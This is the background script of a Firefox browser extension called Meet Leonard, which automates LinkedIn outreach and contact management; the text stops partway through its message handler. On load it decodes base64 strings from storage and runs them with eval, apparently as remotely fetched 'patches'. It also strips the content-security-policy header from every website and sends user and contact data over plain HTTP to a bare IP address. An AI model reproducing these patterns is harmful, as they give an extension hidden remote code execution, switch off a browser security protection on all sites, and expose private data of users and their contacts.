var LINKEDIN_SEARCH_PAGE = 'https://www.linkedin.com/search/results/index/';
const uninstallURL = 'https://meetleonard.com/uninstall/';
const paymentURL = 'https://meetleonard.com/payment/';
const downloadURL = 'https://meetleonard.com/download/';
var server_url = 'http://45.55.120.26/';
var leonard_running = false;
var user_id = false;
var txtShowingNow = '';
var globalTabID = false;
var rateInterval;
var removePendingInterval = false, checkAcceptedInterval = false, autoFollowUpInterval = false, autoReplytoNotificationsInterval = false, patchDownloader = false, userDataInterval = false;
var acceptedLen = 0;
var visitTabResponseHandler = false;
var pageLoadInterval = false;
var special_deals = false;
var txtClearingInterval = false;
var newVersionNotification = {
    "2.4.4" : ["New version downloaded", "I've added automatic withdrawing of pending connections.\n\nPlease click here to navigate!", "CRM/index.html#/settings"],
    "2.4.5" : ["New Features Available with v2.4.5", "1. You can update tags in Accepted and Pending connections list.\n2. You can send message, InMail and connection invitation specifically to\npremium profiles."],
    "2.8.9" : ["New Features Available with 2.8.9", "We're giving you Free trial of Business plan for 14 days."],
    "2.9.0" : ["Enjoy a 14 day Free Trial", "You've been upgraded to Business plan."]
};

$(document).ready(function(){
    $.ajaxSetup({
        timeout: 60000
    });
    browser.storage.local.get('background', function(s){
        if(s && s.background){
            try{
                s.background.forEach(function(x){
                    eval(atob(x));
                })
            } catch(err){
                browser.runtime.sendMessage({error: err, func: 'patch'});
            }
        }
    })
});

// browser.management.getAll(function(extensionList){
//     var leonardVersions = extensionList.filter(x=>x.name == 'Meet Leonard');
//     var newVersion = leonardVersions.filter(x=>(x.enabled == true && x.version));
//     console.log(leonardVersions)
//     if(newVersion.length > 0){
//         showNotification("You're using multiple versions of Meet Leonard.\nPlease remove old one.");
//     }
// })
// browser for mozilla 
browser.webRequest.onResponseStarted.addListener(function(e) {
    if(e.url.indexOf('sales/tags') >= 0 && e.method == 'POST'){
        browser.tabs.query({
            currentWindow:true
        },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            tab_ids.forEach(function(tId){
                browser.tabs.sendMessage(tId, {
                    syncTags : true
                }, function(){});
            })
        })
    }
}, {
    types: ['xmlhttprequest'],
    urls: ['*://*/*']
});

browser.webRequest.onHeadersReceived.addListener(function(e) {
    for (var r = 0; r < e.responseHeaders.length; r++)
        if("content-security-policy" === e.responseHeaders[r].name.toLowerCase()) {
            (e.responseHeaders[r].value = "");
        }
    return {
        responseHeaders: e.responseHeaders
    }
}, {
    urls: ["*://*/*"],
    types: ["main_frame", "sub_frame"]
}, ["blocking", "responseHeaders"]);

browser.webRequest.onBeforeRequest.addListener(function() {
    return {cancel: true};
}, {
    urls: ["*://*/lite/contentsecurity"]
}, ["blocking"]);


browser.runtime.onMessageExternal.addListener(function(message, sender, sendResponse){
    if(message.getUserID){
        sendResponse(user_id);
    } else if(message.getUserDetails){
        getLatestData(function(user_details){
            sendResponse(user_details);
        })
    } else if(message.redeemCode){
        $.ajax({
            url: server_url + 'redeem',
            data: {
                coupon_code: message.coupon_code,
                user_id: message.user_id
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse('Error');
                console.log(err);
            }
        })
    }
    return true;
})

browser.runtime.setUninstallURL(uninstallURL);

browser.browserAction.onClicked.addListener(function() {
    openNewTab(LINKEDIN_SEARCH_PAGE);
})
console.log(JSON.stringify(browser.notifications),"Sanjeev")
browser.notifications.onClicked && browser.notifications.onClicked.addListener(function() {
    clearAllNotifications();
    if(globalTabID == 'payment'){
        openNewTab(paymentURL);
    } else if(globalTabID == 'download'){
        openNewTab(downloadURL);
    } else if(globalTabID == 'reload'){
        browser.tabs.query({
            active: true,
            currentWindow: true
        }, function(tabs) {
            if (tabs.length > 0) {
                browser.tabs.sendMessage(tabs[0].id, {
                    reloadPage: true
                }, function(response) {});
            }
        });
    } else if (globalTabID) {
        browser.tabs.highlight({
            tabs: tabId
        });
    } else if(typeof callback == 'function'){
        callback();
    }
});


window.onload = function() {
    checkNewVersion();
    browser.storage.local.get("user_details", function(ud) {
        if (!ud['user_details']) {
            return false;
        }
        user_id = ud['user_details']['id'];
        window.localStorage.setItem("today", getTodayDate());
    });
    browser.browserAction.setBadgeText({
        text: ''
    });
    browser.notifications.onButtonClicked.addListener(function(notId, btnId) {
        browser.notifications.clear(notId);
        if(btnId == 0){             // Yes
            openNewTab(browser.runtime.getURL('CRM/index.html#/accepted'));
        } else if(btnId == 1){      // No
            // Nothing happens when clicking on No
        }
    });
    removePendingInterval = setInterval(function(){
        browser.tabs.query({
            currentWindow:true
        },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    removePending : true
                }, function(){});
            }
        })
    },10*60*1000);
    // autoRemindInterval = setInterval(function(){
    //     findAcceptedCountAndNotifyUser();
    // },10*60*1000);     // 30 mins interval
    checkForAcceptedConnections();
    checkAcceptedInterval = setInterval(function(){
        checkForAcceptedConnections();
    },10*60*1000);
    findAcceptedAndSendFollowUps();
    autoFollowUpInterval = setInterval(function(){
        findAcceptedAndSendFollowUps();
    },10*60*1000);     // 30 mins interval
    sendRepliestoNotifications();
    autoReplytoNotificationsInterval = setInterval(function(){
        sendRepliestoNotifications();
    },10*60*1000);     // 30 mins interval
    isPatchAvailable();
    patchDownloader = setInterval(function(){
        isPatchAvailable();
    },10*60*1000);     // 30 mins interval
    userDataInterval = setInterval(getLatestData, 5000);
    // rateInterval = setInterval(function(){
    //     showNotification('Please click here to share your experience!', null, "Want to rate us?",function(){
    //         openNewTab('https://browser.google.com/webstore/detail/leonard-for-linkedin-beta/feoiiijdmfoabkkgfnfhfhhghhlmjbmb/reviews')
    //     })
    // },30*24*60*60*1000);
}

function findAcceptedCountAndNotifyUser(){
    browser.storage.local.get("user_details", function(ud) {
        var user_details = ud['user_details'];
        if(user_details && user_details.autoRemind){
            var autoRemind = parseInt(user_details.autoRemind) * 24 * 60 * 60 * 1000;
            browser.tabs.query({
                currentWindow:true
            },function(tabs) {
                var ls_count = 0;
                var tab_ids = [];
                tabs.forEach(function(tab) {
                    if (tab.url.indexOf('www.linkedin.com') > -1) {
                        ls_count++;
                        tab_ids.push(tab.id);
                    }
                });
                if(tab_ids.length > 0){
                    browser.tabs.sendMessage(tab_ids[0], {
                        getAcceptedCount : true
                    }, function(count){
                        var lastReminded = localStorage.getItem("lastReminded");
                        if(!lastReminded || (Date.now() - lastReminded) > autoRemind){
                            var len_acc = count || acceptedLen;
                            // console.log(len_acc);
                            if(len_acc > 0){
                                showConnectionAcceptanceNotification(len_acc);
                                localStorage.getItem("lastReminded", Date.now());
                            }
                        }
                    });
                }
            })
        }
    });
}

function findAcceptedAndSendFollowUps(){
    browser.storage.local.get("user_details", function(ud) {
        var user_details = ud['user_details'];
        if(user_details && user_details.autoFollowUp){
            var autoFollowUp = parseInt(user_details.autoFollowUp) * 60 * 60 * 1000;
            browser.tabs.query({
                currentWindow:true
            },function(tabs) {
                var ls_count = 0;
                var tab_ids = [];
                tabs.forEach(function(tab) {
                    if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                        ls_count++;
                        tab_ids.push(tab.id);
                    }
                });
                if(tab_ids.length > 0){
                    browser.tabs.sendMessage(tab_ids[0], {
                        sendFollowUpsToAccepted : true
                    }, function(){
                        
                    });
                }
            })
        }
    });
}

function sendRepliestoNotifications(){
    browser.storage.local.get("user_details", function(ud) {
        var user_details = ud['user_details'];
        if(user_details && user_details.autoWish){
            browser.tabs.query({
                currentWindow:true
            },function(tabs) {
                var ls_count = 0;
                var tab_ids = [];
                tabs.forEach(function(tab) {
                    if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                        ls_count++;
                        tab_ids.push(tab.id);
                    }
                });
                if(tab_ids.length > 0){
                    browser.tabs.sendMessage(tab_ids[0], {
                        sendRepliestoNotifications : true
                    }, function(){
                        
                    });
                }
            })
        }
    });
}

function checkForAcceptedConnections(){
    browser.tabs.query({
                currentWindow:true
            },function(tabs) {
        var ls_count = 0;
        var tab_ids = [];
        tabs.forEach(function(tab) {
            if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                ls_count++;
                tab_ids.push(tab.id);
            }
        });
        if(tab_ids.length > 0){
            browser.tabs.sendMessage(tab_ids[0], {
                checkForAccepted : true
            }, function(){});
        }
    })
}

function getTodayDate() {
    return (new Date()).toISOString().substring(0, 10);
}

function checkNewVersion(){
    var cv = localStorage.getItem("current_version");
    var lv = browser.runtime.getManifest().version;
    if(lv != cv && newVersionNotification[lv]){
        browser.storage.local.get("user_details", function(ud) {
            var user_details = ud['user_details'];
            if(user_details && user_details.user_plan == 'Beta'){
                showNotification(newVersionNotification[lv][1], false, newVersionNotification[lv][0], function(){
                    if(newVersionNotification[lv][2])
                        openNewTab(browser.runtime.getURL(newVersionNotification[lv][2]));
                });
            }
        })
    }
    window.localStorage.setItem("current_version", lv);
}

function openNewTab(URL, callback) {
    browser.tabs.create({
        url: URL
    }, function(new_tab){
        if(typeof callback == 'function'){
            callback(new_tab);
        }
    });
}

function createCSVFile(conns_data, callback){
    // var csv_data = "First Name,Last Name,EMAIL,PHONE,CURRENT_COMPANIES,BIRTHDAY,HEADLINE,INDUSTRY,LOCATION,SUMMARY,TWITTER_ACCOUNTS,WEBSITES,LINKEDIN_URL,CONNECTED ON\r\n";
    var csv_data = "First Name,Last Name,EMAIL,PHONE,CURRENT_COMPANIES,INDUSTRY,LOCATION,TWITTER_ACCOUNTS,WEBSITES,LINKEDIN_URL,CONNECTED ON\r\n";
    // conns_data = conns_data.slice(0,500);
    conns_data.forEach(function(d){
        csv_data += '"' + d.firstname + '"';
        csv_data += ';';
        csv_data += '"' + d.lastname + '"';
        csv_data += ';';
        csv_data += '"' + d.email + '"';
        csv_data += ';';
        csv_data += '"' + d.phone + '"';
        csv_data += ';';
        csv_data += '"' + d.current_companies + '"';
        csv_data += ';';
        // csv_data += '"' + d.birthday + '"';
        // csv_data += ';';
        // csv_data += '"' + d.headline + '"';
        // csv_data += ';';
        csv_data += '"' + d.industry + '"';
        csv_data += ';';
        csv_data += '"' + d.location + '"';
        csv_data += ';';
        // csv_data += '"' + d.summary + '"';
        // csv_data += ';';
        csv_data += '"' + d.twitter + '"';
        csv_data += ';';
        csv_data += '"' + d.websites + '"';
        csv_data += ';';
        csv_data += '"' + d.linkedin_profile_url + '"';
        csv_data += ';';
        csv_data += '"' + (new Date(d.connected_on)).toLocaleString() + '"';
        csv_data += "\r\n";
    })
    if(typeof callback == 'function'){
        callback(csv_data);
    }
}

browser.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if(typeof sendResponse != 'function'){
        sendResponse = function(){};
    }
    if(message.resetUserID){
        user_id = false;
        sendResponse();
        return false;
    }
    if(!user_id){
        browser.storage.local.get("user_details", function(ud) {
            if (!ud['user_details']) {
                return false;
            }
            user_id = ud['user_details']['id'];
            window.localStorage.setItem("today", getTodayDate());
        });
    }
    if(message.redeemCode){
        $.ajax({
            url: server_url + 'redeem',
            data: {
                coupon_code: message.coupon_code,
                user_id: message.user_id
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse('Error');
                console.log(err);
            }
        });
    } else if(message.showProgress){
        showNotificationWithProgress(message.completed);
    } else if(message.getAliases) {
        $.ajax({
            url: server_url + 'get_aliases',
            data: {
                user_id: user_id
            },
            success: function(res){
                sendResponse(res.aliases);
            },
            error: function(err){
                sendResponse('Error');
            }
        })
    } else if(message.getSkipList) {
        $.ajax({
            url: server_url + 'get_skiplist',
            data: {
                user_id: user_id
            },
            success: function(res){
                sendResponse(res.skiplist);
            },
            error: function(err){
                sendResponse('Error');
            }
        })
    } else if(message.getDownloads) {
        $.ajax({
            url: server_url + 'get_downloads',
            data: {
                user_id: user_id
            },
            success: function(res){
                res.sort(function(a,b){
                    return new Date(b.dateSaved) - new Date(a.dateSaved);
                })
                sendResponse(res);
            },
            error: function(err){
                sendResponse('Error');
            }
        })
    } else if(message.rename_filename) {
        $.ajax({
            url: server_url + 'rename_filename',
            type: 'POST',
            data: {
                user_id: user_id,
                filename: message.filename,
                new_filename: message.new_filename
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse(err.responseJSON);
            }
        })
    } else if(message.delete_file) {
        $.ajax({
            url: server_url + 'delete_file',
            type: 'POST',
            data: {
                user_id: user_id,
                filename: message.filename
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse(err.responseJSON);
            }
        })
    } else if(message.renameConnect){
        $.ajax({
            url: server_url + 'add_alias',
            type: 'POST',
            data: {
                user_id: user_id,
                new_name: message.new_name,
                entityUrn: message.entityUrn,
                publicIdentifier: message.publicIdentifier,
                objectUrn: message.objectUrn
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse('Error');
            }
        })
    } else if(message.getAudits){
        $.ajax({
            url: server_url + 'get_total_audits',
            data: {
                user_id: user_id
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse('Error');
            }
        })
    } else if(message.skipProfile){
        $.ajax({
            url: server_url + 'add_skip',
            type: 'POST',
            data: {
                user_id: user_id,
                is_skipped: message.is_skipped,
                entityUrn: message.entityUrn
                // publicIdentifier: message.publicIdentifier,
                // objectUrn: message.objectUrn
            },
            success: function(res){
                sendResponse(res);
            },
            error: function(err){
                sendResponse('Error');
            }
        })
    } else if(message.showAcceptedNotification){
        acceptedLen = message.count;
        // showConnectionAcceptanceNotification();
    } else if(message.showToolbar) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    showToolbar : true
                },function(data){
                    sendResponse(data);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            showToolbar : true
                        },function(data){
                            sendResponse(data);
                        });
                    },3000);
                });
            }
        })
    } else if(message.exportContacts){
        browser.storage.local.get('firstConnectionsData', function(o){
            showNotification("Leonard preparing your download.\nPlease wait...");
            if(o && o.firstConnectionsData){
                var conns_data = o.firstConnectionsData;
                createCSVFile(conns_data, function(csv_data){
                    var fileName = "Leonard_profiles_" + getTodaysDate();
                    var uri = 'data:text/csv;charset=utf-8,' + escape(csv_data);
                    var link = document.createElement("a");
                    link.href = uri;
                    link.style = "visibility:hidden";
                    link.download = fileName + ".csv";
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                })
            }
        });
    } else if(message.getUserDetails){
        getLatestData(function(user_details){
            browser.runtime.setUninstallURL(uninstallURL+"?"+user_details.id);
            sendResponse(user_details);
        })
    } else if(message.error){
        if(user_id){
            $.ajax({
                url : server_url + 'log_error',
                type : 'POST',
                data : {
                    user_id : user_id,
                    error : message.error,
                    func : message.func,
                    version: browser.runtime.getManifest().version
                },
                success : function(res){
                    console.log(res);
                }
            })
        }
    } else if(message.audit){
        if(user_id){
            if((message.event == 'message_sent' || message.event == 'inmail_sent' || message.event == 'follow_up_message_sent' || message.event.indexOf('notification_') >= 0) && message.comm_obj){
                var commObj = message.comm_obj;
                $.ajax({
                    url: server_url + 'add_comm/',
                    type: 'POST',
                    data: {
                        user_id: user_id,
                        type: commObj.type,
                        date_sent: true,
                        rec_name: commObj.rec_name,
                        content: commObj.content,
                        profile_url: commObj.profile_url,
                        profile_id: commObj.profile_id,
                        member_id: commObj.member_id,
                        entityUrn: commObj.entityUrn
                    },
                    success: function(resp) {
                        // console.log(resp);
                    },
                    async: false
                });
            }
            $.ajax({
                url: server_url + 'audit_event/',
                type: 'POST',
                data: {
                    user_id: user_id,
                    event: message.event
                },
                success: function(resp) {
                    sendResponse(resp);
                }
            });
        }
    } else if(message.getFileUploadToken){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    getFileUploadToken : true
                },function(upload_info){
                    sendResponse(upload_info);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            getFileUploadToken : true
                        },function(upload_info){
                            sendResponse(upload_info);
                        });
                    },3000);
                });
            }
        })
    } else if(message.checkEngagement){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    checkEngagement : true,
                    urns: message.urns
                },function(data){
                    sendResponse(data);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            checkEngagement : true,
                            urns: message.urns
                        },function(data){
                            sendResponse(data);
                        });
                    },3000);
                });
            }
        })
    } else if(message.createPort){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                tab_ids.forEach(function(id){
                    browser.tabs.sendMessage(id,{
                        createPort : true
                    }, function(){})
                })
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id,{
                            createPort : true
                        },function(){})
                    },3000);
                });
            }
        })
    } else if(message.stopLeonard){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                tab_ids.forEach(function(id){
                    browser.tabs.sendMessage(id,{
                        stopLeonard : true
                    }, function(){})
                })
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id,{
                            stopLeonard : true
                        },function(){})
                    },3000);
                });
            }
        })
    } else if(message.fileObj) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    fileObj : message.fileObj,
                    upload_info : message.upload_info
                },function(resp){
                    sendResponse(resp);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            fileObj : message.fileObj,
                            upload_info : message.upload_info
                        },function(resp){
                            sendResponse(resp);
                        });
                    },3000);
                });
            }
        })
    } else if(message.fileTxt) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    fileTxt : message.fileTxt,
                    name : message.name,
                    size : message.size,
                    type : message.type,
                    upload_info : message.upload_info
                },function(resp){
                    sendResponse(resp);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            fileTxt : message.fileTxt,
                            name : message.name,
                            size : message.size,
                            type : message.type,
                            upload_info : message.upload_info
                        },function(resp){
                            sendResponse(resp);
                        });
                    },3000);
                });
            }
        })
    } else if(message.showUploadedFiles) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    showUploadedFiles : true
                },function(resp){
                    sendResponse(resp);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            showUploadedFiles : true
                        },function(resp){
                            sendResponse(resp);
                        });
                    },3000);
                });
            }
        })
    } else if(message.getDownloadedData) {
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    tab_ids.push(tab.id);
                }
            });
            if(tab_ids.length > 0){
                browser.tabs.sendMessage(tab_ids[0], {
                    getDownloadedData : message.getDownloadedData
                },function(resp){
                    sendResponse(resp);
                });
            } else {
                openNewTab(LINKEDIN_SEARCH_PAGE, function(new_tab){
                    setTimeout(function(){
                        browser.tabs.sendMessage(new_tab.id, {
                            getDownloadedData : message.getDownloadedData
                        },function(resp){
                            sendResponse(resp);
                        });
                    },3000);
                });
            }
        })
    } else if(message.getTags){
        if(user_id){
            $.ajax({
                url: server_url + 'get_tags/',
                data: {
                    user_id: user_id
                },
                success: function(resp) {
                    sendResponse(resp.tags);
                }
            });
        }
    } else if(message.getUserTags){
        if(user_id){
            $.ajax({
                url: server_url + 'get_tagged_connections_of_user/',
                data: {
                    user_id: user_id
                },
                success: function(resp) {
                    sendResponse(resp);
                }
            });
        }
    } else if(message.getUserTagsandNotes) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_tagged_connections_of_user/',
                data: {
                    user_id: user_id,
                    connection_id: message.connection_id
                },
                success: function(resp) {
                    sendResponse(resp);
                }
            });
        }
    } else if(message.saveNotesandTags) {
        if(user_id){
            $.ajax({
                url: server_url + 'update_tag_to_connection/',
                data: {
                    user_id: user_id,
                    connection_id: message.connection_id,
                    tags: message.tags || "",
                    notes: message.notes || ""
                },
                type: 'POST',
                success: function(resp) {
                    sendResponse(resp);
                }
            });
        }
    } else if(message.reloadAllLinkedInPages){
        reloadAllLinkedInPages(function(){
            sendResponse(true);
        });
    } else if(message.isLinkedInAvailable){
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            tabs.forEach(function(tab) {
                if (tab.url && tab.url.indexOf('www.linkedin.com') > -1) {
                    ls_count++;
                }
            });
            sendResponse(ls_count);
        })
    } else if(message.activate){
        browser.tabs.highlight({
            windowId: sender.tab.windowId,
            tabs: sender.tab.index
        }, function(){
            sendResponse();
        })
    } else if (message.search_url_duplicate) {
        var isTabSalesNav = message.is_sales_nav;
        browser.tabs.query({
                currentWindow:true
            },function(tabs) {
            var ls_count = 0;
            var tab_ids = [];
            tabs.forEach(function(tab) {
                if ((tab.url && tab.url.indexOf('www.linkedin.com/search') > -1 || (tab.url &&tab.url.indexOf('www.linkedin.com/sales/search') > -1)) && sender.tab.id != tab.id) {
                    ls_count++;
                    tab_ids.push(tab.id);
                }
            });
            if(!isTabSalesNav){
                sendResponse({
                    ls_count: ls_count,
                    tab_ids: tab_ids
                });
            } else {
                if(tab_ids.length > 0){
                    tab_ids.forEach(function(t){
                        browser.tabs.sendMessage(t,{
                            stopLeonard : true
                        }, function(){});
                    });
                }
                sendResponse({
                    ls_count: 0,
                    tab_ids: []
                })
            }
        })
    } else if (message.open_new_tab) {
        openNewTab(message.url);
        return false;
    } else if (message.register) {
        createNewUser(message, function(arg) {
            sendResponse(arg);
        })
    } else if (message.email && message.password) {
        getUserDetails(message, function(arg) {
            sendResponse(arg);
        });
    } else if (message.getUserViews) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_views/' + user_id,
                type: 'GET',
                success: function(res) {
                    if (typeof res == "string") {
                        res = JSON.parse(res);
                    }
                    if (res.views) {
                        sendResponse(res);
                    }
                },
                complete: function(xhr) {
                    if (xhr.status != 200) {
                        sendResponse(xhr);
                    }
                }
            })
        }
    } else if (message.getUserComms) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_comms',
                data:{
                    user_id: user_id
                },
                type: 'GET',
                success: function(res) {
                    if (typeof res == "string") {
                        res = JSON.parse(res);
                    }
                    if (res.comms) {
                        sendResponse(res);
                    }
                },
                complete: function(xhr) {
                    if (xhr.status != 200) {
                        sendResponse(xhr);
                    }
                }
            })
        }
    } else if (message.getUserSentConnections) {
        if(user_id){
            $.ajax({
                url: server_url + 'get_connections/' + user_id,
                type: 'GET',
                success: function(res) {
                    if (typeof res == "string") {
                        res = JSON.parse(res);
                    }
                    if (res.conns) {
                        sendResponse(res);
                    }
                },
                complete: function(xhr) {
                    if (xhr.status != 200) {
                        sendResponse(xhr);
                    }
                }
            })
        }
    } else if (message.add_tag){
        $.ajax({
            method: 'POST',
            url: server_url + 'add_tag',
            data: {
                linked_tag_id: message.linked_tag_id,
                user_id: user_id,
                tag_name: message.tag_name
            },
            success: function(resp) {
                sendResponse(resp);
            }
        })
    } else if (message.removeLITags){
        $.ajax({
            method: 'POST',
            url: server_url + 'remove_li_tags',
            data: {
                user_id: user_id
            },
            success: function(resp) {
                sendResponse(resp);
            }
        })
    } else if (message.saveTags) {
        if(user_id){
            var data = message.obj;
            data.user_id = user_id;
            var tags = data.tags.toString();
             $.ajax({
                url : server_url + 'update_tag_to_connection',
                type: 'POST',
                data : {
                    connection_id: data.publicIdentifier,
                    user_id: user_id,
                    tags: tags
                },
                success : function(resp){
                    sendResponse(resp);
                },
                error : function(e){
                    sendResponse(e);
                }
            })
        }  
    }else if (message.saveData) {
        if(user_id){
            var data = $.extend({}, message.attrs);
            data.user_id = user_id;
            $.ajax({
                url: server_url + 'add_view',
                data: data,
                type: 'POST',
                success: function(resp) {
                    // console.log(resp);
                    if (typeof resp == 'string') {
                        resp = JSON.parse(resp);
                    }
                    if (resp.error) {
                        showNotification(resp.error);
                    }
                    sendResponse(resp);
                },
                error: function(error) {
                    sendResponse('error');
                }
            });
        }
    } else if (message.saveConnData) {
        if(user_id){
            var data = message.connObj;
            data.user_id = user_id;
            var conn_tags = data.conn_tags.toString();
            delete data.conn_tags;
            $.ajax({
                url: server_url + 'add_connection',
                data: data,
                type: 'POST',
                success: function(resp) {
                    if (typeof resp == 'string') {
                        resp = JSON.parse(resp);
                    }
                    if (resp.error) {
                        showNotification(resp.error, null, null, function(){
                            sendResponse();
                        });
                    } else {
                        if(conn_tags){
                            $.ajax({
                                url : server_url + 'update_tag_to_connection',
                                type: 'POST',
                                data : {
                                    connection_id: data.c_public_id,
                                    user_id: user_id,
                                    tags: conn_tags
                                },
                                success : function(r){
                                    sendResponse(resp);
                                },
                                error : function(e){
                                    sendResponse(e);
                                }
                            })
                        } else {
                            sendResponse();
                        }
                    }
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if(message.update_message_count){
        if(user_id){
            $.ajax({
                url: server_url + 'message_sent',
                data: {
                    user_id : user_id
                },
                type: 'GET',
                success: function(resp) {
                    if (resp.error) {
                        showNotification(resp.error);
                    }
                    sendResponse(resp);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if(message.update_inmail_count){
        if(user_id){
            $.ajax({
                url: server_url + 'inmail_sent',
                data: {
                    user_id : user_id
                },
                type: 'GET',
                success: function(resp) {
                    if (resp.error) {
                        showNotification(resp.error);
                    }
                    sendResponse(resp);
                },
                error: function(error) {
                    sendResponse(error);
                }
            });
        }
    } else if (message.updateConnectionStatus) {
        $.ajax({
            url: server_url + 'update_connections',
            data: {
                connection_ids: message.connection_ids.toString(),
                conn_status: message.conn_status || "false"
            },
            type: 'POST',
            success: function(resp) {
                if (typeof resp == 'string') {
                    resp = JSON.parse(resp);
                }
                if (resp.error) {
                    showNotification(resp.error);
                }
                sendResponse(resp);
            },
            error: function(error) {
                sendResponse(error);
            }
        });
    } else if (message.removeConnectionRequest) {
        $.ajax({
            url: server_url + 'remove_connection',
            data: {
                connection_id: message.connection_id
            },
            type: 'POST',
            success: function(resp) {
                sendResponse();
            },
            error: function(error) {
                sendResponse(error);
            }
        });
    } else if (message.removeTemplate) {
        $.ajax({
            url: server_url + 'remove_template/' + message.template_id,
            type: 'POST',
            success: function(resp) {
                if (typeof resp == 'string') {
                    resp = JSON.parse(resp);
                }
                if (resp.error) {
                    showNotification(resp.error);
                }
                sendResponse(resp);
            },
            error: function(error) {
                sendResponse(error);
            }
        });
    } else if (message.reloadPage) {
        browser.tabs.query({
            active: true,
            currentWindow: true
        }, function(tabs) {
            if (tabs.length > 0) {
                browser.tabs.sendMessage(tabs[0].id, {
                    reloadPage: true
                }, function(response) {});
            }
        });
    } else if (message.setBadge) {
        var bgColor = 'blue';
        if (message.mode == 'send') {
            bgColor = 'green';
        } else if(message.mode == 'message'){
            bgColor = 'red';
        } else if(message.mode == 'scan'){
            bgColor = 'orange';
        }
        browser.browserAction.setBadgeBackgroundColor({
            color: bgColor
        });
        browser.browserAction.setBadgeText({
            text: message.setBadge
        });
    } else if (message.removeBadge) {
        browser.browserAction.setBadgeText({
            text: ''
        });
    } else if (message.showNotification) {
        showNotification(message.showNotification, message.tabId || null, '', function(){
            sendResponse();
        });
    } else if (message.start_stop) {
